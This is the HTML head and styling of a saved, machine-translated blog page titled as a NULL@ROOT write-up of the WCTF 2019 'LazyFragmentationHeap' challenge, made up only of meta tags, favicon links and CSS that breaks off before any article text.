<!DOCTYPE html>
<html lang="en" data-darkreader-mode="dynamic" data-darkreader-scheme="dark" class="translated-ltr" style="overflow: auto;"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, #bit-notification-bar-iframe, ::-webkit-calendar-picker-indicator {
    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
  background-color: var(--darkreader-inline-bgcolor) !important;
}
[data-darkreader-inline-bgimage] {
  background-image: var(--darkreader-inline-bgimage) !important;
}
[data-darkreader-inline-border] {
  border-color: var(--darkreader-inline-border) !important;
}
[data-darkreader-inline-border-bottom] {
  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
}
[data-darkreader-inline-border-left] {
  border-left-color: var(--darkreader-inline-border-left) !important;
}
[data-darkreader-inline-border-right] {
  border-right-color: var(--darkreader-inline-border-right) !important;
}
[data-darkreader-inline-border-top] {
  border-top-color: var(--darkreader-inline-border-top) !important;
}
[data-darkreader-inline-boxshadow] {
  box-shadow: var(--darkreader-inline-boxshadow) !important;
}
[data-darkreader-inline-color] {
  color: var(--darkreader-inline-color) !important;
}
[data-darkreader-inline-fill] {
  fill: var(--darkreader-inline-fill) !important;
}
[data-darkreader-inline-stroke] {
  stroke: var(--darkreader-inline-stroke) !important;
}
[data-darkreader-inline-outline] {
  outline-color: var(--darkreader-inline-outline) !important;
}
[data-darkreader-inline-stopcolor] {
  stop-color: var(--darkreader-inline-stopcolor) !important;
}</style><style class="darkreader darkreader--variables" media="screen">:root {
   --darkreader-neutral-background: #131516;
   --darkreader-neutral-text: #d8d4cf;
   --darkreader-selection-background: #004daa;
   --darkreader-selection-text: #e8e6e3;
}</style><style class="darkreader darkreader--root-vars" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">html {
    background-color: #181a1b !important;
}
html {
    color-scheme: dark !important;
}
html, body {
    background-color: #181a1b;
}
html, body {
    border-color: #736b5e;
    color: #e8e6e3;
}
a {
    color: #3391ff;
}
table {
    border-color: #545b5e;
}
::placeholder {
    color: #b2aba1;
}
input:-webkit-autofill,
textarea:-webkit-autofill,
select:-webkit-autofill {
    background-color: #404400 !important;
    color: #e8e6e3 !important;
}
::-webkit-scrollbar {
    background-color: #202324;
    color: #aba499;
}
::-webkit-scrollbar-thumb {
    background-color: #454a4d;
}
::-webkit-scrollbar-thumb:hover {
    background-color: #575e62;
}
::-webkit-scrollbar-thumb:active {
    background-color: #484e51;
}
::-webkit-scrollbar-corner {
    background-color: #181a1b;
}
* {
    scrollbar-color: #454a4d #202324;
}
::selection {
    background-color: #004daa !important;
    color: #e8e6e3 !important;
}
::-moz-selection {
    background-color: #004daa !important;
    color: #e8e6e3 !important;
}</style>
  <!-- base href="https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html" -->
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="Underground hacker group">
  <meta name="author" content="NULL@ROOT"><!-- Begin Jekyll SEO tag v2.8.0 -->
  <title>[Writeup] LazyFragmentationHeap - WCTF 2019 | NULL@ROOT</title>
  <meta name="generator" content="Jekyll v3.9.3">
  <meta property="og:title" content="[Writeup] LazyFragmentationHeap - WCTF 2019">
  <meta name="author" content="y0ny0ns0n">
  <meta property="og:locale" content="en_US">
  <meta name="description" content="작성 - y0ny0ns0n @ null2root">
  <meta property="og:description" content="작성 - y0ny0ns0n @ null2root">
  <link rel="canonical" href="https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html">
  <meta property="og:url" content="https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html">
  <meta property="og:site_name" content="NULL@ROOT">
  <meta property="og:type" content="article">
  <meta property="article:published_time" content="2020-02-07T02:53:00+00:00">
  <meta name="twitter:card" content="summary">
  <meta property="twitter:title" content="[Writeup] LazyFragmentationHeap - WCTF 2019">
  <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"y0ny0ns0n"},"dateModified":"2020-02-07T02:53:00+00:00","datePublished":"2020-02-07T02:53:00+00:00","description":"작성 - y0ny0ns0n @ null2root","headline":"[Writeup] LazyFragmentationHeap - WCTF 2019","mainEntityOfPage":{"@type":"WebPage","@id":"https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html"},"url":"https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html"}</script><!-- End Jekyll SEO tag -->
  <link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://null2root.github.io/assets/images/favicon/apple-touch-icon-57x57.png">
  <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://null2root.github.io/assets/images/favicon/apple-touch-icon-114x114.png">
  <link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://null2root.github.io/assets/images/favicon/apple-touch-icon-72x72.png">
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://null2root.github.io/assets/images/favicon/apple-touch-icon-144x144.png">
  <link rel="apple-touch-icon-precomposed" sizes="60x60" href="https://null2root.github.io/assets/images/favicon/apple-touch-icon-60x60.png">
  <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://null2root.github.io/assets/images/favicon/apple-touch-icon-120x120.png">
  <link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://null2root.github.io/assets/images/favicon/apple-touch-icon-76x76.png">
  <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://null2root.github.io/assets/images/favicon/apple-touch-icon-152x152.png">
  <link rel="icon" type="image/png" href="https://null2root.github.io/assets/images/favicon/favicon-196x196.png" sizes="196x196">
  <link rel="icon" type="image/png" href="https://null2root.github.io/assets/images/favicon/favicon-96x96.png" sizes="96x96">
  <link rel="icon" type="image/png" href="https://null2root.github.io/assets/images/favicon/favicon-32x32.png" sizes="32x32">
  <link rel="icon" type="image/png" href="https://null2root.github.io/assets/images/favicon/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="https://null2root.github.io/assets/images/favicon/favicon-128.png" sizes="128x128">
  <meta name="application-name" content="&nbsp;">
  <meta name="msapplication-TileColor" content="#FFFFFF">
  <meta name="msapplication-TileImage" content="mstile-144x144.png">
  <meta name="msapplication-square70x70logo" content="mstile-70x70.png">
  <meta name="msapplication-square150x150logo" content="mstile-150x150.png">
  <meta name="msapplication-wide310x150logo" content="mstile-310x150.png">
  <meta name="msapplication-square310x310logo" content="mstile-310x310.png">
  <link rel="canonical" href="https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html">
  <link rel="alternate" type="application/rss+xml" title="" href="https://null2root.github.io/feed.xml">
  <style> /*! normalize.css v4.1.1 | MIT License | github.com/necolas/normalize.css */html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block}audio:not([controls]){display:none;height:0}progress{vertical-align:baseline}template,[hidden]{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:inherit}b,strong{font-weight:bolder}dfn{font-style:italic}h1{font-size:2em;margin:0.67em 0}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-0.25em}sup{top:-0.5em}img{border-style:none}svg:not(:root){overflow:hidden}code,kbd,pre,samp{font-family:monospace, monospace;font-size:1em}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}button,input,select,textarea{font:inherit;margin:0}optgroup{font-weight:bold}button,input{overflow:visible}button,select{text-transform:none}button,html [type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid #c0c0c0;margin:0 2px;padding:0.35em 0.625em 0.75em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-cancel-button,[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:0.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}.highlight .c{color:#998;font-style:italic}.highlight .err{color:#a61717;background-color:#e3d2d2}.highlight .k{font-weight:bold}.highlight .o{font-weight:bold}.highlight .cm{color:#998;font-style:italic}.highlight .cp{color:#999;font-weight:bold}.highlight .c1{color:#998;font-style:italic}.highlight .cs{color:#999;font-weight:bold;font-style:italic}.highlight .gd{color:#000;background-color:#fdd}.highlight .gd .x{color:#000;background-color:#faa}.highlight .ge{font-style:italic}.highlight .gr{color:#a00}.highlight .gh{color:#999}.highlight .gi{color:#000;background-color:#dfd}.highlight .gi .x{color:#000;background-color:#afa}.highlight .go{color:#888}.highlight .gp{color:#555}.highlight .gs{font-weight:bold}.highlight .gu{color:purple;font-weight:bold}.highlight .gt{color:#a00}.highlight .kc{font-weight:bold}.highlight .kd{font-weight:bold}.highlight .kn{font-weight:bold}.highlight .kp{font-weight:bold}.highlight .kr{font-weight:bold}.highlight .kt{color:#458;font-weight:bold}.highlight .m{color:#099}.highlight .s{color:#d14}.highlight .n{color:#333}.highlight .na{color:teal}.highlight .nb{color:#0086b3}.highlight .nc{color:#458;font-weight:bold}.highlight .no{color:teal}.highlight .ni{color:purple}.highlight .ne{color:#900;font-weight:bold}.highlight .nf{color:#900;font-weight:bold}.highlight .nn{color:#555}.highlight .nt{color:navy}.highlight .nv{color:teal}.highlight .ow{font-weight:bold}.highlight .w{color:#bbb}.highlight .mf{color:#099}.highlight .mh{color:#099}.highlight .mi{color:#099}.highlight .mo{color:#099}.highlight .sb{color:#d14}.highlight .sc{color:#d14}.highlight .sd{color:#d14}.highlight .s2{color:#d14}.highlight .se{color:#d14}.highlight .sh{color:#d14}.highlight .si{color:#d14}.highlight .sx{color:#d14}.highlight .sr{color:#009926}.highlight .s1{color:#d14}.highlight .ss{color:#990073}.highlight .bp{color:#999}.highlight .vc{color:teal}.highlight .vg{color:teal}.highlight .vi{color:teal}.highlight .il{color:#099}.highlight .gc{color:#999;background-color:#EAF2F5}body,html{font-size:62.5%}body{line-height:1;font:16px "Helvetica Neue",Helvetica,Arial,sans-serif;color:#666}h1,h2,h3,h4{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;color:#222;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}h1{font-size:3rem;letter-spacing:-1px;color:#222;font-weight:700}h2{font-size:2.2rem}h3{font-size:2rem}h4{font-size:1.6rem}a{color:indigo;text-decoration:underline}p{line-height:1.7;color:#666;font-weight:300;margin-bottom:20px;letter-spacing:.4px}@media only screen and (max-width: 400px){p{letter-spacing:.2px}}strong{font-weight:400;color:#000}ul li,ol li{line-height:2.4rem;font-weight:300;color:#666}img,pre,iframe{max-width:100%}img,pre{border-radius:4px}figcaption{position:relative;top:-20px;left:0;right:0;margin:0 auto;width:100%;text-align:center;font-size:1.3rem;color:#aaa;font-weight:300}@media only screen and (max-width: 400px){figcaption{font-size:1.2rem}}blockquote{padding-left:15px;border-left:3px solid #eee}hr{border:none;height:1px;margin:40px auto;background:#eee;width:100%}figure.highlight{width:100%;margin:0}code,tt{padding:1px 0;font-family:"Consolas",Liberation Mono,Menlo,Courier,monospace;font-size:12px;line-height:20px;background:#fff;border-radius:2px;border-radius:2px}pre{box-sizing:border-box;margin:0 0 1.75em 0;width:100%;padding:5px 10px;font-family:"Consolas",Liberation Mono,Menlo,Courier,monospace;font-size:1.2rem;line-height:2rem;overflow:auto;background:#fff;border:1px solid #ededed;border-radius:2px}.wrapper-normal,.wrapper-large{height:100%;width:96%;margin:0 auto}@media only screen and (max-width: 400px){.wrapper-normal,.wrapper-large{width:88%}}@media only screen and (min-width: 400px) and (max-width: 1050px){.wrapper-normal,.wrapper-large{width:88%}}.wrapper-normal{max-width:810px}.wrapper-large{max-width:1024px}.text-center{text-align:center}.clearfix:before,.clearfix:after{content:"";display:table}.clearfix:after{clear:both}.animated{animation:fade-in-down .6s;animation-delay:.3s;animation-fill-mode:both}@keyframes fade-in-down{0%{opacity:0;transform:translateY(-10px)}100%{opacity:1;transform:translateY(0)}}.home,.blog,.projects{margin-top:125px}.home>.list,.blog>.list,.projects>.list{border-top:1px solid #ededed;margin-top:30px;padding-top:40px;position:relative}.home>.list:before,.blog>.list:before,.projects>.list:before{display:block;content:" ";width:7px;height:7px;border:#ededed 1px solid;position:absolute;top:-5px;left:50%;margin-left:-5px;background:#FFF;box-shadow:#FFF 0 0 0 5px;border-radius:3px}.home>.list>.item,.blog>.list>.item,.projects>.list>.item{display:block;width:95%;margin:0 auto}.home>.list>.item>.url,.blog>.list>.item>.url,.projects>.list>.item>.url{width:100%;display:block;padding:20px 0;text-decoration:none}.home>.list>.item>.url>.title,.blog>.list>.item>.url>.title,.projects>.list>.item>.url>.title{margin:0;width:75%;font-weight:500;transition:all ease-in-out .2s}.home>.list>.item:hover>.url>.title,.blog>.list>.item:hover>.url>.title,.projects>.list>.item:hover>.url>.title{color:indigo}.home>.list aside,.blog>.list aside,.projects>.list aside{position:relative;top:2px;margin:0;width:25%;float:right;font-weight:300;color:#aaa;text-align:right;transition:all ease-in-out .2s}.home>.list .item:hover .url aside,.blog>.list .item:hover .url aside,.projects>.list .item:hover .url aside{color:#666}.blog>.list>.item>.url>.title,.projects>.list>.item>.url>.title{display:inline}.blog>.list>.item>.url>.emoji,.projects>.list>.item>.url>.emoji{display:inline;position:relative;top:-4px;margin-right:10px}.page{margin-top:125px}.page>h1{text-align:center;margin-bottom:6rem}.about img{width:50%;margin:0 auto;display:block}.post{margin-top:125px}.post>.title{text-align:center;margin-bottom:3rem}.post>.date,.post>.post-tags{color:#aaa;font-weight:300;font-size:1.4rem;text-transform:uppercase;text-align:center;display:block;margin-bottom:6rem;letter-spacing:1px;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}.post>.date{margin-bottom:2rem}.post>.post-tags>.item{padding:2px 8px;border-radius:3px;font-size:1.1rem;background:#ededed;color:#666;letter-spacing:1px;margin:3px 1px;text-decoration:none;display:inline-block}.post>h2,.post>h3,.post>h4{margin-top:40px}.post>h2 a,.post>h3 a,.post>h4 a{text-decoration:none}.post>.title-image{max-height:360px;display:block;margin:0 auto}.post>.blog-navigation{font-size:1.4rem;display:block;width:auto;overflow:hidden}.post>.blog-navigation a{display:block;width:50%;float:left;margin:1em 0}.post>.blog-navigation .next{text-align:right}.tags{margin-top:125px}.tags>.list{border-top:1px solid #ededed;margin-top:30px;padding-top:40px;position:relative}.tags>.list:before{display:block;content:" ";width:7px;height:7px;border:#ededed 1px solid;position:absolute;top:-5px;left:50%;margin-left:-5px;background:#FFF;box-shadow:#FFF 0 0 0 5px;border-radius:3px}.tags>.list>.item{font-weight:300;text-transform:uppercase;text-align:center;margin-bottom:6rem;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;padding:3px 9px;border-radius:3px;font-size:1.3rem;background:#ededed;color:#666;letter-spacing:1px;margin:0 .5rem 1rem;text-decoration:none;display:inline-block}.tag-list>.list{padding:0}.tag-list>.list>.item{display:block;width:80%;margin:0 10%}.tag-list>.list>.item>.url{width:100%;height:100%;display:block;padding:20px 0;text-decoration:none}.tag-list>.list>.item>.url>.title{margin:0;width:75%;font-weight:400;transition:all ease-in-out .2s;font-size:1.6rem}.tag-list>.list>.item:hover>.url>.title{color:indigo}.tag-list>.list aside{position:relative;top:2px;margin:0;width:25%;float:right;font-weight:300;color:#aaa;text-align:right;transition:all ease-in-out .2s;font-size:1.6rem}.tag-list>.list .item:hover .url aside{color:#666}.author{padding:3rem 0;border-bottom:1px solid #ededed;border-top:1px solid #ededed;max-width:100%;margin:4rem auto 0}.author>.toleft>.selfie{width:90%;border-radius:100%}.author>.toright>.name,.author>.toright>.bio{width:60%;display:inline-block}.author>.toright>.name{font-size:1.5rem;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-weight:500;margin:6px 0 0}@media only screen and (max-width: 400px){.author>.toright>.name{width:100%;display:block}}@media only screen and (min-width: 400px) and (max-width: 1050px){.author>.toright>.name{width:100%;display:block}}.author>.toright>.bio{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-weight:300;color:#aaa;font-size:1.3rem;text-align:justify;line-height:1.5;margin:0}@media only screen and (max-width: 400px){.author>.toright>.bio{width:100%;display:block}}@media only screen and (min-width: 400px) and (max-width: 1050px){.author>.toright>.bio{width:100%;display:block}}.author>.toleft{width:10%;display:inline-block}@media only screen and (max-width: 400px){.author>.toleft{width:20%}}@media only screen and (min-width: 400px) and (max-width: 1050px){.author>.toleft{width:20%}}.author>.toright{width:89%;display:inline-block;vertical-align:top}@media only screen and (max-width: 400px){.author>.toright{width:78%}}@media only screen and (min-width: 400px) and (max-width: 1050px){.author>.toright{width:78%}}.no-disqus{border-bottom:none;padding-bottom:0}.disqus{margin:0 auto;max-width:100%;padding:40px 0}.footer-main{border-top:1px solid #ededed;padding:40px 0;margin:40px 0 0;font-size:1.3rem;color:#aaa;font-weight:300;text-align:center;position:relative}.footer-main:before{display:block;content:" ";width:7px;height:7px;border:#ededed 1px solid;position:absolute;top:-5px;left:50%;margin-left:-5px;background:#FFF;box-shadow:#FFF 0 0 0 5px;border-radius:3px}.footer-main>.link{display:inline}.footer-main>.link>.icon{width:15px !important;fill:#aaa !important;transition:ease-in-out all .3s;position:relative;top:3px;display:inherit;margin:0}.footer-main>.link>.icon:hover{fill:indigo !important}.footer-main>.extra{color:#aaa;margin-top:0}.footer-main>.extra>.link{color:#222;text-decoration:none;border-bottom:1px solid transparent;transition:ease-in-out all .3s;padding-bottom:1px}.footer-main>.extra>.link:hover{border-color:#aaa}.header-home{display:block;margin:0 auto;text-align:center;position:relative;z-index:99}.header-home>.link>.selfie{width:125px;margin-bottom:25px;border-radius:100%;transition:all .2s;box-shadow:0;opacity:1}.header-home>.link>.selfie:hover{box-shadow:0 0px 4px 0 rgba(0,0,0,0.18),0 0px 12px 0 rgba(0,0,0,0.15);opacity:.8}.header-home>.title{font-size:4rem;margin:0 0 13px}.header-home>.description{font-size:1.85rem;font-weight:300;font-style:normal;color:#aaa;width:70%;margin:0 auto 30px}.header-home>.description a{font-weight:200}.nav>.list,.nav-home>.list{list-style:none;margin:0;padding:0 13px 0}.nav>.list>.item,.nav-home>.list>.item{display:inline-block}.nav>.list>.item>.link,.nav-home>.list>.item>.link{display:inline-block;font-weight:300;font-size:1.4rem;padding:20px 10px;text-decoration:none}.nav{position:absolute;right:0;top:0}.nav>.list{padding:0 13px 0}.nav>.list>.item>.link{font-size:1.4rem;padding:20px 10px}.nav-home{margin-top:40px;text-align:center}.nav-home>.list{padding:0}.nav-home>.list>.item>.link{font-size:2rem;padding:7px 15px;margin:0;border-radius:4%;transition:all .4s ease-in-out;width:70px}.nav-home>.list>.item>.link:hover{color:#666}.evidence{background-image:linear-gradient(to bottom, rgba(39,243,106,0.15), rgba(39,243,106,0.15));color:beta}.star>.url>.title{width:auto !important;display:inline;background-image:linear-gradient(rgba(39,243,106,0.15), rgba(39,243,106,0.15))}.twitter-tweet{margin:10px auto}.icon{display:inline-block;width:17px;height:17px;fill:#000;text-align:center;color:#000;margin:7px auto}.caption{position:relative;top:1rem;left:0;right:0;margin:0 auto;width:100%;text-align:center;font-size:1.3rem}.bigger-image{min-width:130%;margin:5rem 0 5rem -15%}@media only screen and (max-width: 400px){.bigger-image{min-width:114%;margin:2rem 0 2rem -7%}}@media only screen and (min-width: 400px) and (max-width: 1050px){.bigger-image{min-width:114%;margin:2rem 0 2rem -7%}}.breaker{height:1px;margin:6rem auto;width:100%}.breaker:before{content:"• • •";width:100%;text-align:center;display:block;color:#aaa;letter-spacing:4px;position:relative;top:-8px}.pagination{width:95%;margin:3rem auto 0;text-align:center}.pagination>.page_number{display:inline-block;font-size:1.3rem}.pagination>.previous,.pagination>.next{display:inline-block;font-size:1.8rem;position:relative;top:1px;padding:1px 9px}.pagination>.hidden{visibility:hidden}.related{margin:10rem 0 0rem}.share{float:right;width:40%;display:inline;text-align:right;position:relative;top:-10px}@media only screen and (max-width: 400px){.share{width:100%;display:block;top:0;text-align:left;float:none;margin-top:5px}}@media only screen and (min-width: 400px) and (max-width: 1050px){.share{width:100%;display:block;top:0;text-align:left;float:none;margin-top:5px}}.share>.twitter,.share>.facebook,.share>.google-plus,.share>.linkedin,.share>.reddit{display:inline;vertical-align:middle;font-size:13px;font-weight:700;color:#fff;padding:6px 10px;border-radius:3px;margin-left:5px;text-decoration:none}@media only screen and (max-width: 400px){.share>.twitter,.share>.facebook,.share>.google-plus,.share>.linkedin,.share>.reddit{margin:0 5px 10px 0}}@media only screen and (min-width: 400px) and (max-width: 1050px){.share>.twitter,.share>.facebook,.share>.google-plus,.share>.linkedin,.share>.reddit{margin:0 5px 10px 0}}.share>.twitter{background:#4fafed}.share>.facebook{background:#4361b3}.share>.google-plus{background:#dd4b39}.share>.linkedin{background:#0077b5}.share>.reddit{background:#ff4500}.share svg{fill:#fff;position:relative;top:3px;margin:0;margin-right:4px;display:inherit}@media only screen and (min-width: 780px){.side-by-side{width:130%;margin:6rem 0 6rem -15%}}@media only screen and (max-width: 780px){.side-by-side{width:100%;margin:4rem 0}}.side-by-side>.toleft,.side-by-side>.toright{display:inline-block;width:47.5%}@media only screen and (max-width: 780px){.side-by-side>.toleft img,.side-by-side>.toright img{text-align:center;display:block;margin:0 auto}}@media only screen and (min-width: 780px){.side-by-side>.toleft{margin-right:2%}}@media only screen and (max-width: 780px){.side-by-side>.toleft{width:100%;margin:0 0 4rem 0}}@media only screen and (min-width: 780px){.side-by-side>.toright{margin-left:2%;vertical-align:top}}@media only screen and (max-width: 780px){.side-by-side>.toright{width:100%;margin:0 0 4rem 0}}.side-by-side>.toleft>p,.side-by-side>.toright>p{margin:0 0 4rem 0}@media only screen and (max-width: 780px){.side-by-side>.toleft>p,.side-by-side>.toright>p{margin:0}}.social-links{margin-top:20px}.social-links>.link{margin:0;text-decoration:none;position:relative;display:inline-block;height:35px;width:35px}.social-links>.link:hover>.icon{fill:indigo}.social-links>.link:hover:before{opacity:1;display:inline-block;transform:translate3d(0, 0, 0);white-space:nowrap}.social-links>.link:before{content:attr(data-title);display:none;position:absolute;bottom:-34px;left:-6px;margin:0 auto;font-size:13px;padding:3px 10px;background:#222;color:#fff;border-radius:2px;height:22px;line-height:22px;opacity:0;transition:opacity 150ms linear,transform 150ms linear,-webkit-transform 150ms linear;transform:translate3d(0, -8px, 0);z-index:99}.social-links>.link:after{content:"";position:absolute;top:35px;left:13px;width:0;height:0;border-left:5px solid transparent;border-right:5px solid transparent;border-bottom:6px solid #222;opacity:0;transition:opacity 150ms linear,transform 150ms linear,-webkit-transform 150ms linear;transform:translate3d(0, -8px, 0);z-index:100}.social-links>.link:hover:after{opacity:1;transform:translate3d(0, 0, 0)}.social-links>.icon{transition:all ease-in-out .2s}.spoiler{position:relative}.spoiler:before{content:"";background-color:#fafae0;position:absolute;top:0;bottom:0;left:0;right:0;z-index:50}.spoiler:hover:before{display:none} </style><style class="darkreader darkreader--sync" media="screen"></style>
  <meta http-equiv="X-Translated-By" content="Google">
  <meta http-equiv="X-Translated-To" content="en">
  <script type="text/javascript" src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/m=corsproxy" data-sourceurl="https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html"></script><meta name="darkreader" content="42c9ea0acde645d0ac802d39c9d61c93"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: #7b5300 !important;
    border-color: #d8b013 !important;
    color: #f3e8c8 !important;
}
#vimvixen-console-frame {
    color-scheme: light !important
}
::placeholder {
    opacity: 0.5 !important;
}
#edge-translate-panel-body,
.MuiTypography-body1,
.nfe-quote-text {
    color: var(--darkreader-neutral-text) !important;
}
gr-main-header {
    background-color: #0f3a48 !important;
}
.tou-z65h9k,
.tou-mignzq,
.tou-1b6i2ox,
.tou-lnqlqk {
    background-color: var(--darkreader-neutral-background) !important;
}
.tou-75mvi {
    background-color: #032029 !important;
}
.tou-ta9e87,
.tou-1w3fhi0,
.tou-1b8t2us,
.tou-py7lfi,
.tou-1lpmd9d,
.tou-1frrtv8,
.tou-17ezmgn {
    background-color: #0a0a0a !important;
}
.tou-uknfeu {
    background-color: #231603 !important;
}
.tou-6i3zyv {
    background-color: #19576c !important;
}
div.mermaid-viewer-control-panel .btn {
  fill: var(--darkreader-neutral-text);
  background-color: var(--darkreader-neutral-background);
}
svg g rect.er {
  fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.entityBox {
  fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxOdd {
  fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxEven {
  fill-opacity: 0.8 !important;
  fill: var(--darkreader-selection-background);
}
svg rect.er.relationshipLabelBox {
  fill: var(--darkreader-neutral-background) !important;
}
svg g g.nodes rect, svg g g.nodes polygon {
  fill: var(--darkreader-neutral-background) !important;
}
svg g rect.task {
  fill: var(--darkreader-selection-background) !important;
}
svg line.messageLine0, svg line.messageLine1 {
  stroke: var(--darkreader-neutral-text) !important;
}
div.mermaid .actor {
  fill: var(--darkreader-neutral-background) !important;
}
embed[type="application/pdf"] { filter: invert(100%) contrast(90%); }</style>
  <script type="text/javascript" src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/m=phishing_protection" data-phishing-protection-enabled="false" data-source-url="https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html"></script>
  <meta name="robots" content="none">
 <script async="" src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazy.min.js"></script><script type="text/javascript" async="" src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/embed.js"></script><link type="text/css" rel="stylesheet" charset="UTF-8" href="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/m=el_main_css.css"><style class="darkreader darkreader--cors" media="screen">.VIpgJd-ZVi9od-ORHb-OEVmcd{left:0;top:0;height:39px;width:100%;z-index:10000001;position:fixed;border:none;border-bottom:1px solid #6B90DA;margin:0;box-shadow:0 0 8px 1px #999}.VIpgJd-ZVi9od-xl07Ob-OEVmcd{z-index:10000002;border:none;position:fixed;box-shadow:0 3px 8px 2px #999}.VIpgJd-ZVi9od-SmfZ-OEVmcd{z-index:10000000;border:none;margin:0}.goog-te-gadget{font-family:arial;font-size:11px;color:#666;white-space:nowrap}.goog-te-gadget img{vertical-align:middle;border:none}.goog-te-gadget-simple{background-color:#FFF;border-left:1px solid #D5D5D5;border-top:1px solid #9B9B9B;border-bottom:1px solid #E8E8E8;border-right:1px solid #D5D5D5;font-size:10pt;display:inline-block;padding-top:1px;padding-bottom:2px;cursor:pointer}.goog-te-gadget-icon{margin-left:2px;margin-right:2px;width:19px;height:19px;border:none;vertical-align:middle}.goog-te-combo{margin-left:4px;margin-right:4px;vertical-align:baseline}.goog-te-gadget .goog-te-combo{margin:4px 0}.VIpgJd-ZVi9od-l4eHX-hSRGPd,.VIpgJd-ZVi9od-l4eHX-hSRGPd:link,.VIpgJd-ZVi9od-l4eHX-hSRGPd:visited,.VIpgJd-ZVi9od-l4eHX-hSRGPd:hover,.VIpgJd-ZVi9od-l4eHX-hSRGPd:active{font-size:12px;font-weight:bold;color:#444;text-decoration:none}.VIpgJd-ZVi9od-ORHb .VIpgJd-ZVi9od-l4eHX-hSRGPd,.VIpgJd-ZVi9od-TvD9Pc-hSRGPd{display:block;margin:0 10px}.VIpgJd-ZVi9od-ORHb .VIpgJd-ZVi9od-l4eHX-hSRGPd{padding-top:2px;padding-left:4px}.goog-te-combo,.VIpgJd-ZVi9od-ORHb *,.VIpgJd-ZVi9od-SmfZ *,.VIpgJd-ZVi9od-xl07Ob *,.VIpgJd-ZVi9od-vH1Gmf *,.VIpgJd-ZVi9od-l9xktf *{font-family:arial;font-size:10pt}.VIpgJd-ZVi9od-ORHb{margin:0;background-color:#E4EFFB;overflow:hidden}.VIpgJd-ZVi9od-ORHb img{border:none}.VIpgJd-ZVi9od-ORHb-bN97Pc{color:#000}.VIpgJd-ZVi9od-ORHb-bN97Pc img{vertical-align:middle}.VIpgJd-ZVi9od-ORHb-Tswv1b{color:#666;vertical-align:top;margin-top:0;font-size:7pt}.VIpgJd-ZVi9od-ORHb-KE6vqe{width:8px}.VIpgJd-ZVi9od-LgbsSe{border-color:#E7E7E7;border-style:none solid solid none;border-width:0 1px 1px 0}.VIpgJd-ZVi9od-LgbsSe 